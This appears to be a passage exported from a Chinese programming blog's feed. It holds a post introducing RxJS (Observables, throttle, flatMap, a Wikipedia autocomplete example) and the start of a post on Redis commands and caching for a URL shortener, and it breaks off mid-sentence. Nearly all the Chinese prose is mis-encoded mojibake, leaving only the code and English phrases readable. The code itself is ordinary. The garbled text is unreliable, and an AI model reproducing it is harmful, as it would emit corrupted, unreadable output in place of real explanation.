ç›¸ä¿¡è½é Rx çš„è®€è€…ï¼Œæ‡‰è©²ä¹Ÿæœƒè€³è RxJS, RxJAVA, RxAndroidç­‰ç­‰ï¼Œå› æ­¤è¢« Google æ…£å£çš„æˆ‘å€‘ä¸€å®šæœƒè©¦è‘—å»æœå°‹ä¸€ä¸‹ Rx åˆ°åº•æ˜¯ä»€éº¼
ç„¶å¾Œåœ¨ Google Search Result page çš„æœ€ä¸‹æ–¹æœƒçœ‹åˆ° MSDN çš„ Reactive Extensions å’Œ ReactiveX 

å¥½çš„çœ‹ä¾†å°±æ˜¯æˆ‘å€‘è¦æ‰¾çš„æ±è¥¿ï¼Œä½†é€™å¥½çœ¼ç†Ÿå–”? æ˜¯æ¯å¤©åœ¨å¯«çš„Reactå—ï¼Ÿé›£é“æ˜¯ç›¸é—œçš„æ±è¥¿ï¼Ÿ!
å®šç›ä¸€çœ‹æœƒç™¼ç¾â€¦ æ©ï¼ŒåŸºæœ¬ä¸Šæ²’ä»€éº¼é—œä¿‚ã€‚
Reactive Extensions æ˜¯ Microsoft open source æ¨å»£çš„ä¸€å€‹lib
Reactive Extensions (Rx) is a library for composing asynchronous and event-based programs using observable sequences and LINQ-style query operators.
ç¶²ç«™é€£çµï¼šrxç¶²ç«™é€£çµï¼šReactiveX.io

ReactiveX is a combination of the best ideas from the Observer pattern, the Iterator pattern, and functional programming
ok, Observer pattern, Iterator patter, functional programming éƒ½è½éï¼Œè€Œé€™äº›ä¸²èµ·ä¾†ä¼¼ä¹å°±æ˜¯å‚³èªªä¸­çš„ Reactive Programming.
What is Reactive Programming?Reactive Programming æ˜¯ä¸€ç¨®ä»¥ asynchronous data streams ç‚ºä¸­å¿ƒæ€æƒ³å‡ºç™¼çš„ç¨‹å¼æ’°å¯«æ–¹å¼ï¼Œæ¯”è¼ƒå¸¸è½åˆ°çš„æ˜¯ asynchronous eventï¼Œåƒæ˜¯ user click event, mouse hover event ç­‰ç­‰ï¼Œè€Œé€™é‚Šç‰¹åˆ¥çš„å‰‡æ˜¯ data èˆ‡ **stream**ï¼Œé¡§åæ€ç¾©ï¼ŒReactive Extensions å°‡ event å»¶ä¼¸ç‚º dataï¼Œä¸¦ä¸”æ³¨é‡åœ¨ stream ï¼ˆä¸²æµï¼‰ä¸Šï¼Œä¹Ÿå°±æ˜¯ **æ™‚é–“åºåˆ—ä¸Šçš„ä¸€é€£ä¸²è³‡æ–™äº‹ä»¶**ï¼ŒRxè®“ä½ å°‡ä»»ä½•äº‹æƒ…éƒ½è®ŠåŒ–ç‚º data streams : variables, user inputs, properties, caches, data structures ç­‰ç­‰çš†å¯ï¼Œé€é Observe é€™äº› data streamsï¼Œä¸¦ä¾æ“šå…¶é€ æˆçš„ side effects é€²è¡Œå°æ‡‰çš„å‹•ä½œã€‚
Stream:	 æ™‚é–“åºåˆ—ä¸Šçš„ä¸€é€£ä¸²è³‡æ–™äº‹ä»¶ä»¥ä¸€å€‹ click event ä¾†èªªï¼Œåœ¨ user é»æ“Šçš„å‹•ä½œç™¼ç”Ÿå¾Œï¼Œæœƒæœ‰ä¸€æ®µæ™‚é–“è§¸ç™¼äº†å¹¾å€‹äº‹ä»¶ (event stream)ï¼švalue, error or completed signal

è€Œåœ¨ Reactive Programming çš„æ¦‚å¿µä¸‹ï¼Œä½ å¯ä»¥æŠŠä»»ä½•äº‹æƒ…éƒ½çœ‹ä½œ Streamï¼Œä¸¦ä¸” Observe stream ä¸­çš„è®ŠåŒ–ï¼Œä»¥ä¸‹é¢ä¸€å€‹ä¾‹å­ä¾†èªªï¼š
å‡è¨­æˆ‘å€‘æƒ³è¦å°å‡ºä¸€å€‹åŒ…å« 1 åˆ° 5 çš„ Arrayï¼Œä¸€èˆ¬æˆ‘å€‘æœƒé€™æ¨£åšï¼š
example 1
iterate1To5.jsvar source = [1,2,3,4,5];source.map((item) =&gt; &#123;  console.log(&quot;onNext: &quot;+item);&#125;)

ç„¶è€Œï¼Œä»¥Rxä¾†èªªï¼Œä»»ä½•äº‹æƒ…éƒ½è¦ Observableï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥é€™æ¨£åšï¼š
observe1To5.js// Creates an observable sequence of 5 integersvar source = Rx.Observable.range(1, 5);// catch every status and print out valuevar subscription = source.subscribe(    x =&gt; console.log(&#x27;onNext: &#x27; + x),      e =&gt; console.log(&#x27;onError: &#x27; + e.message),      () =&gt; console.log(&#x27;onCompleted&#x27;));
åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘å€‘å‰µå»ºäº†ä¸€å€‹ Observable çš„æ•´æ•¸é™£åˆ—ï¼Œä¸¦ä¸”é€é subscribe çš„å‹•ä½œå» listening é€™å€‹é™£åˆ—ï¼Œç•¶æœ‰æˆ‘å€‘è¨­å®šçš„ event è§¸ç™¼æ™‚ï¼Œæˆ‘å€‘å°±æœƒ observe åˆ°ï¼Œä¸¦æ¡å–å°æ‡‰å‹•ä½œï¼Œé€™åŸºæœ¬ä¸Šå°±æ˜¯ Observer Design Pattern åšçš„äº‹æƒ…
Why RxJSä»¥ Javascript ä¾†èªªï¼Œæƒ³è¦æŠ“å–é€™äº›äº‹ä»¶ï¼Œä¸€èˆ¬å¯ä»¥ç”¨ callback æˆ–æ˜¯ Promise ä¾†é”æˆï¼Œç„¶è€Œ Promise ä¸»è¦è¨­è¨ˆæ–¼ä¸€æ¬¡æ€§çš„äº‹ä»¶èˆ‡å–®ä¸€å›å‚³å€¼ï¼Œè€Œ RxJS é™¤äº†åŒ…å« Promise å¤–ï¼Œæä¾›äº†æ›´è±å¯Œçš„æ•´åˆæ‡‰ç”¨ã€‚




Single return value
Mutiple return values



Pull&#x2F;Synchronous&#x2F;Interactive
Object
Iterables (Array&#x2F;Set&#x2F;Map&#x2F;Object)


Push&#x2F;Asynchronous&#x2F;Reactive
Promise
Observable


é‚„è¨˜å¾—å‰é¢ ReactiveX çš„å®šç¾©å—ï¼Ÿ â€œcombination of Observer pattern, Iterator pattern and functional programmingâ€ 
RxJS çµåˆ Array#extras çš„å„ªé»ï¼Œè®“ä½ èƒ½å¤ æ–¹ä¾¿è™•ç† Multiple return values
å»¶ä¼¸ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼š
example 2
iteratorPattern.jsconst data = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;];const source = Rx.Observable                 .interval(500)                 .take(6)                 .map(i =&gt; data[i])const result = sourceresult.subscribe(x =&gt; console.log(x));
ç•¶ä½  subscribe é€™å€‹ Observale çš„ data source æ™‚ï¼Œä»–èƒ½è®“ä½  ç›£è½ é™£åˆ—ä¸­ï¼Œæ¯ 500ms (interval) å–ä¸€å€‹å€¼ (map(i &#x3D;&gt; data[i])) ä¸¦å– 6 æ¬¡ (take(6))
å†å›åˆ°æœ€æ—©çš„ click event ä¾†èªªï¼Œå‡è‹¥æˆ‘å€‘æƒ³è¦èƒ½å¤ æŠ“å– single click èˆ‡ double click çš„äº‹ä»¶ï¼Œç”¨æœ€åŸå§‹çš„ javascript å¯èƒ½æœƒéœ€è¦è¨±å¤šè®Šæ•¸ä¾†ç´€éŒ„ç‹€æ…‹ã€æ™‚é–“ç­‰ç­‰ï¼Œä½†é€é RxJS æä¾›çš„ libraryï¼Œä½ åªéœ€è¦çŸ­çŸ­å››è¡Œ code å°±å¯ä»¥é”æˆï¼š
å®Œæ•´ç¯„ä¾‹
multiClickStream.jsvar multiClickStream = clickStream    .buffer(function() &#123; return clickStream.throttle(250); &#125;)    .map(function(list) &#123; return list.length; &#125;)    .filter(function(x) &#123; return x &gt;= 2; &#125;);

     
ç”±ä¸Šåœ–å¯ä»¥æ¸…æ¥šçœ‹åˆ°ï¼ŒRxJS å¹«ä½ æŠŠ Stream ä¸Šçš„ event ä¾ç…§ä½ æƒ³è¦çš„æ™‚é–“åš æ•´ç†ï¼Œbuffer ä½è§¸ç™¼æ™‚é–“åœ¨ 250ms é–“çš„ click eventsï¼Œä¸¦ä¸”åˆ©ç”¨ map å‡½å¼æŠ“å‡ºæ¯å€‹ event list çš„é•·åº¦ï¼Œä¸¦é€²ä¸€æ­¥æŠ“å‡ºé•·åº¦å¤§æ–¼ 2 ï¼Œä¹Ÿå°±æ˜¯ double click çš„ event å‡ºä¾†ã€‚
æ¥è‘—ä½ åªéœ€è¦ subscribe ä½ å‰›å‰›å®šç¾©çš„ event streamï¼Œå³å¯åšå‡ºåæ‡‰(reaction)
multiClickStream.jsmultiClickStream.subscribe(function (numclicks) &#123;    document.querySelector(&#x27;h2&#x27;).textContent = &#x27;&#x27;+numclicks+&#x27;x click&#x27;;&#125;);

More examples (Autocompletion service)ä»¥ç¾åœ¨çš„ web app ä¾†èªªï¼Œå¤§é‡ä¾è³´ user äº’å‹•çš„æ•ˆæœèˆ‡å‘ˆç¾ï¼Œåœ¨ä¸å½±éŸ¿ä½¿ç”¨è€…é«”é©—çš„å‰æä¸‹ï¼Œå¤šæ˜¯ç”¨éåŒæ­¥çš„æ–¹å¼å»æŠ“å–è³‡æ–™ã€æ¸²æŸ“é é¢ç­‰ç­‰ï¼Œå› æ­¤ Rx ç³»åˆ—çš„å‡ºç¾çµ•å°æ˜¯ä¸€å€‹å¾ˆå¤§çš„åŠ©ç›Šã€‚
æœ€å¾Œè®“æˆ‘å€‘å†ä»¥ä¸€å€‹ä¾‹å­ä¾†åšçµå°¾ï¼Œåˆ©ç”¨ RxJS èˆ‡ Jquery æ‰“é€  Wikipedia Autocompletion Serviceã€‚
å®Œæ•´ç¯„ä¾‹(source: http://xgrommx.github.io/rx-book/why_rx.html)
Step 1var keyups = Rx.Observable.fromEvent(input, &#x27;keyup&#x27;)    .map(e =&gt; e.target.value)    .filter(text =&gt; text.length &gt; 2);/* Now throttle the input for 500ms */var throttled = keyups.throttle(500 /* ms */);/* Now get only distinct values, so we eliminate the arrows and other control characters */var distinct = throttled.distinctUntilChanged();


æˆ‘å€‘å…ˆåˆ©ç”¨ Rx.Observable.fromEvent ä¾† Create ä¸€å€‹ binding keyup event çš„ Observalbe keyups objectï¼Œä¸¦ä¸”é‡å°æ¯æ¬¡äº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œå›å‚³è¢«ç¶å®šçš„å…ƒç´ å…¶ value å€¼é•·åº¦å¤§æ–¼äºŒçš„

æ¥è‘—è¨­å®š keyups çš„ throttle æ™‚é–“ï¼Œå°‡ 500ms å…§çš„inputç•¶åšä¸€æ¬¡eventå»è§¸ç™¼

å†ä¾†å‰”é™¤æ‰ä¸ç›¸å¹²çš„æ§åˆ¶è¼¸å…¥ï¼ŒåªæŠ“å– distinct çš„ value


Step 2function searchWikipedia (term) &#123;    return $.ajax(&#123;        url: &#x27;http://en.wikipedia.org/w/api.php&#x27;,        dataType: &#x27;jsonp&#x27;,        data: &#123;            action: &#x27;opensearch&#x27;,            format: &#x27;json&#x27;,            search: term        &#125;    &#125;).promise();&#125;


ç°¡å–®æ’°å¯«ä¸€å€‹ ajax ä¾† fetch search api
é€™é‚Šæˆ‘å€‘ç›´æ¥ return promiseï¼ŒRxJS æœƒå¹«ä½  wrap èµ·ä¾†è®Šæˆ Obserbaleï¼Œæˆ–æ˜¯ä½ ä¹Ÿå¯ä»¥åˆ©ç”¨ Rx.Observable.fromPromise ä¾†å°‡åŸæœ‰çš„ Promise æ”¹è£

Step 3var suggestions = distinct.flatMapLatest(searchWikipedia);


åˆ©ç”¨ flatMapLatest å°‡å‰›æ‰çš„ Observable object distinct èˆ‡ searchWikipedia function åšçµåˆï¼Œthen we good to go! (å…ˆä¸ç®¡flatMapLatestæ˜¯ä»€éº¼ï¼Œç¸½ä¹‹ä»–æœƒå°‡ distinct é€™å€‹ Observable sequenceå…§çš„å…ƒç´ ä¸Ÿçµ¦ searchWikipediaï¼Œä¸¦å°‡å›å‚³å›ä¾†çš„è³‡æ–™å†è½‰æ›æˆ Observable sequenceï¼Œè®“äººå¯ä»¥ subscribe)

Step 4suggestions.subscribe(data =&gt; &#123;    var res = data[1];    $results.empty();    $.each(res, (_, value) =&gt; $(&#x27;&lt;li&gt;&#x27; + value + &#x27;&lt;/li&gt;&#x27;).appendTo($results));&#125;, error =&gt; &#123;    /* handle any errors */    $results.empty();    $(&#x27;&lt;li&gt;Error: &#x27; + error + &#x27;&lt;/li&gt;&#x27;).appendTo($results);&#125;);


æ¥è‘—å°±æ˜¯ Subscribe å‰›å‰›çš„ Observable sequence suggestionsï¼Œä¸¦å°‡ listen åˆ°çš„è³‡æ–™ show å‡ºä¾†

å°±é€™éº¼ç°¡å–®å®Œæˆäº†ä¸€å€‹ Autocompletion çš„ service äº†ï¼
é¡Œå¤–è©±å…ˆç°¡å–®ä»‹ç´¹ä»€éº¼æ˜¯ flatMap èˆ‡ flatMapLatestï¼Œç•¢ç«Ÿå‰›å‰›ç¯„ä¾‹æœ‰ç”¨åˆ°ï¼Œè€Œå¯¦éš›ä¸Š RxJS é‚„æœ‰å¾ˆå¤šè¤‡é›œçš„ function å¯ä»¥æ‡‰ç”¨ï¼Œå¾…ä¹‹å¾Œæˆ‘æœ‰æ™‚é–“å†ç¹¼çºŒå°ˆç ”å§ï¼ä½†æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥åœ¨æ–‡ç« æœ€ä¸‹æ–¹çš„é€£çµæ‰¾åˆ°è³‡æºã€‚
flatMap æœƒå°‡ ä¸€å€‹ Observable Sequence çš„å…ƒç´  æ˜ å°„åˆ° å¦ä¸€å€‹æ–°çš„ Observable Sequenceï¼Œä¸¦ä¸”subscribe åŸå…ˆçš„ Observable Sequence çš„äººä¹Ÿéƒ½å¯ä»¥è½å¾—åˆ°
ç°¡å–®çš„ä¾‹å­å¦‚ä¸‹ï¼š
flatMapconsole.clear();var source = Rx.Observable    .range(1, 2)    .flatMap(function (x) &#123;        return Rx.Observable.range(x, 2);        &#125;);var subscription = source.subscribe(    function (x) &#123;        console.log(&#x27;Next: &#x27; + x);    &#125;,    function (err) &#123;        console.log(&#x27;Error: &#x27; + err);       &#125;,    function () &#123;        console.log(&#x27;Completed&#x27;);       &#125;);   // Result: // =&gt; Next: 1 // =&gt; Next: 2  Rx.Observable.range(1, 2)// =&gt; Next: 2 // =&gt; Next: 3  Rx.Observable.range(2, 2)// =&gt; Completed    

See? ä»–æœƒæŠŠ sequence ä¸­çš„å…ƒç´ ä¸Ÿé€² callbackï¼Œä¸¦å›å‚³ Observable sequenceï¼Œä½ ä¹Ÿå¯ä»¥ä¸Ÿå…¥ Promiseï¼Œå°±åƒç¯„ä¾‹ä¸­åšçš„ã€‚
è€Œ flatMapLatest å‰‡æ˜¯åªæœƒé€²è¡Œæœ€å¾Œä¸€æ¬¡çš„ sequenceï¼Œä»¥å‰›å‰›çš„ç¯„ä¾‹ä¾†èªªï¼Œæœ€å¾Œsubscribeçš„äººæ¥æ”¶åˆ°çš„æœƒæ˜¯æœ€æ–°çš„é‚£å€‹ Observable sequence çš„çµæœï¼è€Œä¸æœƒæ¯æ‰“ä¸€å€‹å­—æ‰€æœå°‹çš„çµæœéƒ½ä¸€ç›´ç´¯åŠ é¡¯ç¤ºä¸Šå»ã€‚
One more thingåœ¨æˆ‘å‰é¢æ”¾çš„åœ–ä¸­ï¼Œæç¹ª Click event çš„ å«åš marble åœ–ï¼Œé€™é‚Šæœ‰å€‹ç¶²ç«™å¯ä»¥è®“ä½ ä»¥è¦–è¦ºåŒ–äº’å‹•çš„æ–¹å¼å»æ“ä½œé€™äº› eventï¼Œå¹«åŠ©ä½ ç†è§£ Rx ç•¶ä¸­çš„å„å€‹ function ä¹‹åŠŸç”¨ï¼éå¸¸æ¨è–¦ï¼ï¼å»ç©ç©å§ï¼rxmarbles
ç¸½çµRx çœŸçš„æ˜¯è »æœ‰è¶£çš„æ±è¥¿ï¼Œæä¾›çš„libåˆè™Ÿç¨±æ¯«ç„¡ç›¸ä¾æ€§ï¼Œå¯ä»¥æ‡‰ç”¨åœ¨å„ç¨®frameworkä¸Šæ–¹ï¼Œåªæ˜¯å¿…é ˆè¦æ‡‚å¾—å¦‚ä½•Think in Reactive Programmingï¼Œå¦å‰‡é€™äº›libçš„ç”¨æ³•é‚„çœŸçš„æ˜¯ä¸å¥½ç†è§£ï¼Œé€™ç¯‡æ‹‹ç£šå¼•ç‰ç°¡å–®ä»‹ç´¹ä¸€ä¸‹ï¼Œä¹‹å¾Œæœƒå†æœ‰æ›´æ·±å…¥çš„ç ”ç©¶ï¼ æœ‰ä»€éº¼èªªæ˜ä¸å°çš„åœ°æ–¹ä¹Ÿè«‹è¦‹è«’èˆ‡æŒ‡æ•™ï¼
åƒè€ƒè³‡æ–™

The introduction to Reactive Programming youâ€™ve been missing (by @andrestaltz)
Rx-book
Reactive-Extensions RxJS
rxmarbles

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>Rx, RxJS</tag>
      </tags>
  </entry>
  <entry>
    <title>è³‡æ–™åº«çš„å¥½å¤¥ä¼´ï¼šRedis</title>
    <url>/2016/06/18/redis-introduction/</url>
    <content><![CDATA[å‰è¨€Redis æ˜¯ä¸€å€‹ in-memory çš„ key-value databaseï¼Œå› æ­¤å¸¸å¸¸è¢«ç”¨åœ¨éœ€è¦å¿«å–ï¼ˆCacheï¼‰ä¸€äº›è³‡æ–™çš„å ´åˆï¼Œå¯ä»¥æ¸›è¼•è¨±å¤šå¾Œç«¯è³‡æ–™åº«çš„å£“åŠ›ã€‚é€™ç¯‡å°±ä¾†ç°¡å–®ä»‹ç´¹ä¸€ä¸‹ Redis æä¾›å“ªäº›å¥½ç”¨çš„æ±è¥¿ï¼Œä»¥åŠå¯ä»¥æ‡‰ç”¨åœ¨ä»€éº¼åœ°æ–¹ã€‚
å¸¸ç”¨æŒ‡ä»¤Redis çš„å®˜ç¶²åˆ—å‡ºäº†æ”¯æ´çš„æ¯ä¸€æ¢æŒ‡ä»¤ï¼Œæˆ‘å€‘å…ˆä¾†çœ‹çœ‹æœ€ç°¡å–®çš„ï¼š
SET, GETredis&gt; SET mykey &quot;Hello&quot;redis&gt; GET mykey&quot;Hello&quot;
å‰é¢æœ‰æåˆ°èªª Redis æ˜¯ä¸€å€‹ key-value pair çš„è³‡æ–™åº«ï¼Œå› æ­¤æœ€ç°¡å–®çš„ SET å°±æ˜¯è¨­å®šæŸå€‹ key çš„å€¼æ˜¯å¤šå°‘ï¼Œè¦å–å‡ºä¾†çš„è©±å°±ç”¨ GET å°±å¥½ã€‚
INCR, DECRredis&gt; SET mykey &quot;10&quot;redis&gt; DECR mykey(integer) 9redis&gt; INCR mykey(integer) 10

é¡§åæ€ç¾©å°±æ˜¯é‡å°æŸå€‹ key åŠ ä¸€æˆ–æ¸›ä¸€çš„æ„æ€ï¼Œåƒæ˜¯ç¨‹å¼èªè¨€è£¡é¢çš„mykey++è·Ÿmykey--ã€‚é‚„æœ‰ INCRBY èˆ‡ DECRBYï¼Œå¯ä»¥æŒ‡å®šä½ è¦åŠ æ¸›çš„æ•¸é‡æ˜¯å¤šå°‘ã€‚
HSET, HGETredis&gt; HSET mydata name &quot;nick&quot;redis&gt; HSET mydata nickname &quot;nicknick&quot;redis&gt; HGET mydata name&quot;nick&quot;

H å°±æ˜¯ Hashmap çš„æ„æ€ï¼Œæ‰€ä»¥ä½ å¯ä»¥å­˜å–ä¸€å€‹ value åº•ä¸‹çš„ fieldï¼Œè®“ä½ å¯ä»¥æ›´å¤šå…ƒçš„ä½¿ç”¨ï¼Œä¾‹å¦‚èªªä½ å¯ä»¥å®šç¾© key çš„è¦å‰‡æ˜¯ï¼šPOST + æ–‡ç«  idï¼Œè£¡é¢å°±å¯ä»¥å­˜é€™ç¯‡æ–‡ç« çš„è®šæ•¸ã€å›è¦†æ•¸ç­‰ç­‰ï¼Œå°±ä¸ç”¨æ¯ä¸€æ¬¡éƒ½å» Database è£¡é¢é‡æ–°æŠ“å–ã€‚
SADD, SCARDredis&gt; SADD myset &quot;nick&quot;redis&gt; SADD myset &quot;peter&quot;redis&gt; SADD myset &quot;nick&quot;redis&gt; SCARD myset(integer) 2

SADD çš„ S å°±æ˜¯ Set çš„æ„æ€ï¼Œé€™é‚Šçš„ Set æŒ‡çš„æ˜¯è³‡æ–™çµæ§‹å­¸éçš„é‚£å€‹ Setï¼Œè£¡é¢ä¸æœƒæœ‰é‡è¤‡çš„å…§å®¹ã€‚
LPUSH, RPUSH, LSET, LRANGEredis&gt; LPUSH mylist &quot;a&quot;redis&gt; LPUSH mylist &quot;b&quot;redis&gt; RPUSH mylist &quot;c&quot;redis&gt; LRANGE mylist 0 -11) &quot;b&quot;2) &quot;a&quot;3) &quot;c&quot;redis&gt; LSET mylist 0 &quot;d&quot;redis&gt; LRANGE mylist 0 -11) &quot;d&quot;2) &quot;a&quot;3) &quot;c&quot;

é€™é‚Šçš„è³‡æ–™çµæ§‹æ˜¯ Listï¼Œä½ å¯ä»¥é¸æ“‡å¾å·¦é‚Šæˆ–æ˜¯å³é‚Š push å€¼é€²å»ï¼Œå°æ‡‰åˆ°çš„æŒ‡ä»¤å°±æ˜¯ LPUSH èˆ‡ RPUSHï¼ŒLSET å‰‡æ˜¯æŒ‡å®šæŸå€‹ index çš„ value æ˜¯å¤šå°‘ã€‚  
LRANGE å¯ä»¥å°å‡ºæŒ‡å®šç¯„åœçš„å€¼ï¼Œæ”¯æ´-1é€™ç¨®å½¢å¼ï¼Œè¡¨ç¤ºæœ€å¾Œä¸€å€‹å€¼ã€‚
å¯¦éš›æ‡‰ç”¨Redis å¥½ç”¨çš„åœ°æ–¹å°±åœ¨æ–¼é€Ÿåº¦å¾ˆå¿«ï¼Œæ‰€ä»¥è‹¥æ˜¯é–‹ç™¼ä¸Šç¢°åˆ°ä¸€äº›å ´åˆéœ€è¦é€Ÿåº¦å¾ˆå¿«çš„è©±ï¼Œä½ å¯ä»¥å…ˆè€ƒæ…®çœ‹çœ‹ Redis æ˜¯ä¸æ˜¯èƒ½å¤ å¹«åŠ©åˆ°ä½ ï¼Œä»¥ä¸‹å°±èˆ‰å¹¾å€‹æˆ‘å¯¦éš›ä½¿ç”¨éçš„ä¾‹å­ã€‚  
çŸ­ç¶²å€ç³»çµ±å…¶å¯¦çŸ­ç¶²å€çš„åŸç†éå¸¸ç°¡å–®ï¼Œå°±æ˜¯ä¸€å€‹ hash å°æ‡‰åˆ°ä¸€å€‹ç¶²å€ï¼Œhash æ˜¯ç”¨éš¨æ©Ÿç”¢ç”Ÿï¼Œå¹¾ç¢¼æˆ–æ˜¯è¦æœ‰ä»€éº¼ç¬¦è™Ÿå¯ä»¥è‡ªå·±æ±ºå®šï¼Œæ¥è‘—å°±æŠŠé€™çµ„å°æ‡‰é—œä¿‚å­˜åˆ°è³‡æ–™åº«è£¡é¢ï¼Œåˆ¥äºº query ç›¸æ‡‰çš„ key æ™‚ï¼Œä½ å°± redirect åˆ°ç›¸æ‡‰çš„ç¶²å€å»å°±å¥½äº†ã€‚  
ä¹Ÿå› ç‚ºæ˜¯é€™ç¨® key-value çš„ä¸€å°ä¸€é—œä¿‚ï¼Œæ‰€ä»¥éå¸¸é©åˆä½¿ç”¨ Redisã€‚å¦‚æœä½ ä¸ç”¨åƒæ˜¯ Redis é€™ç¨®çš„ key-value cacheï¼Œå°±å¿…é ˆã€Œæ¯ä¸€æ¬¡ã€éƒ½å¾ Database å» queryã€‚è‹¥æ˜¯è³‡æ–™é‡å°é‚„å¥½ï¼Œä½†è³‡æ–™é‡ä¸€è®Šå¤§çš„æ™‚å€™ï¼Œæ™‚é–“ä¸€å®šæœƒå¢åŠ ï¼Œè³‡æ–™åº«çš„è² è·ä¹Ÿæœƒå¢åŠ ï¼Œå› æ­¤åœ¨è³‡æ–™åº«è·Ÿé‚è¼¯å±¤ä¹‹é–“å¼•é€²ä¸€å±¤å¿«å–ï¼Œæˆ‘èªç‚ºæ˜¯å¾ˆå¥½çš„é¸æ“‡ã€‚  
å¯¦ä½œçš„éç¨‹ä¹Ÿå¾ˆç°¡å–®ï¼Œ  

ä½¿ç”¨è€…æ–°å¢çŸ­ç¶²å€ï¼Œç³»çµ±äº‚æ•¸ç”¢ç”Ÿ abc123 å°æ‡‰åˆ° http://techbridge.cc
æŠŠ key&#x3D;abc123, value&#x3D;http://techbridge.cc å¯«é€²è³‡æ–™åº«
åŒä¸Šï¼Œä½†æ˜¯æ˜¯å„²å­˜åœ¨ Redis
ç•¶æœ‰ä½¿ç”¨è€…é»æ“Šï¼šabc123 é€™å€‹ç¶²å€æ™‚ï¼Œå…ˆå» Redis æŸ¥æœ‰æ²’æœ‰é€™å€‹ key
æœ‰çš„è©±ï¼Œredirect åˆ°å°æ‡‰çš„ç¶²å€
æ²’æœ‰çš„è©±ï¼Œåªå¥½å»è³‡æ–™åº«æŸ¥ï¼ŒæŸ¥å®Œä¹‹å¾Œè¨˜å¾—å¯«ä¸€ä»½åˆ° Redis

è‹¥æ˜¯ä½ çš„è³‡æ–™æœ‰è¶…ç´šå¤šç­†ï¼Œåˆä¸æƒ³èŠ±å¾ˆå¤šçš„éŒ¢æº–å‚™ä¸€å°è¨˜æ†¶é«”å¾ˆå¤§çš„ Redis Serverï¼ˆè³‡æ–™åº«æ˜¯ç”¨ç¡¬ç¢Ÿå„²å­˜ï¼ŒRedis æ˜¯å­˜åœ¨è¨˜æ†¶é«”ï¼Œä»¥å„²å­˜æˆæœ¬ä¾†èªªï¼Œè³‡æ–™åº«æœƒä¾¿å®œè¨±å¤šï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨ Redis çš„ Expire é€™å€‹åŠŸèƒ½ã€‚  
ç•¶ä½ åœ¨å„²å­˜è³‡æ–™çš„æ™‚å€™ï¼Œä½ å¯ä»¥æ–°å¢ä¸€å€‹ Expire time çš„åƒæ•¸ï¼Œç•¶é€™å€‹æ™‚é–“ä¸€åˆ°ä¹‹å¾Œï¼Œé€™å€‹ key å°±æœƒè‡ªå‹•è¢«æ¸…é™¤ã€‚èˆ‰ä¾‹ä¾†èªªï¼ŒçŸ­ç¶²å€çš„ expire å¯ä»¥è¨­å®šæˆ 7 å¤©ï¼Œç•¶æŸå€‹ç¶²å€ 7 å¤©å…§éƒ½æ²’æœ‰è¢«ä»»ä½•ä½¿ç”¨è€…è¨ªå•çš„è©±ï¼Œå°±æœƒè‡ªå‹•è¢«åˆªé™¤ã€‚  
é€™æ¨£çš„å¥½è™•æ˜¯ä½ å¯ä»¥æ¸›å°‘è¨˜æ†¶é«”çš„ä½¿ç”¨é‡ï¼Œåªä¿æŒæŸäº›ã€Œç†±è³‡æ–™ã€æœƒå­˜åœ¨ Redisï¼Œå…¶ä»–æ¯”è¼ƒå†·é–€ã€ä¸å¸¸è¢«è¨ªå•çš„æ•¸æ“šï¼Œå°±å­˜åœ¨ Databaseï¼Œç­‰åˆ°è¢«è¨ªå•çš„æ™‚å€™å†å¯«åˆ° Redis å³å¯ã€‚  
çµ±è¨ˆç³»çµ±å…¶å¯¦ä¸Šé¢è¬›åˆ°çš„çŸ­ç¶²å€æœå‹™ï¼Œé™¤äº†ç¸®ç¶²å€é€™å€‹åŠŸèƒ½ï¼Œé‚„æœ‰å¦ä¸€å€‹é‡é»ï¼Œé‚£å°±æ˜¯ï¼šçµ±è¨ˆè³‡æ–™ã€‚ä¾‹å¦‚èªª Google çŸ­ç¶²å€ï¼Œæœƒæä¾›çµ¦ä½ ï¼šé€ è¨ªæ¬¡æ•¸ã€åœ–è¡¨ã€ç”¨ä»€éº¼è£ç½®ç­‰ç­‰ï¼Œé€™äº›æ‰æ˜¯çŸ­ç¶²å€æœå‹™çš„æ ¸å¿ƒã€‚  
å¦‚æœè¦åšé€™å€‹åŠŸèƒ½ï¼Œé‚£ä½ å‹¢å¿…è¦è¨˜éŒ„æ¯ä¸€æ¬¡ Requestï¼Œæˆ–è‡³å°‘è¦æŠŠ Request çš„å…§å®¹ï¼ˆç”¨ä»€éº¼æ‰‹æ©Ÿã€æ™‚é–“é»ã€IPï¼‰è¨˜éŒ„ä¸‹ä¾†ï¼Œæ‰æœ‰æ•¸æ“šå¯ä»¥çµ¦ä½¿ç”¨è€…çœ‹ã€‚  
å­˜åœ¨ Databaseï¼Œè®€å–ä¹Ÿæ˜¯æ¯æ¬¡éƒ½å¾ Database è®€çš„è©±ï¼Œå°±æœƒé€ æˆä¸€äº›æ•ˆèƒ½ä¸Šçš„ issueï¼Œä¾‹å¦‚èªªæ¯æ¬¡ refresh çµ±è¨ˆé é¢ï¼Œä½ å°±å¿…é ˆé‡æ–°ï¼šselect conut(*) from short_url where id=&quot;abc123&quot;ä¸€æ¬¡ï¼Œæ‰èƒ½æŠ“åˆ°ç¸½å…±æœ‰å¤šå°‘äººé€ è¨ªã€‚  
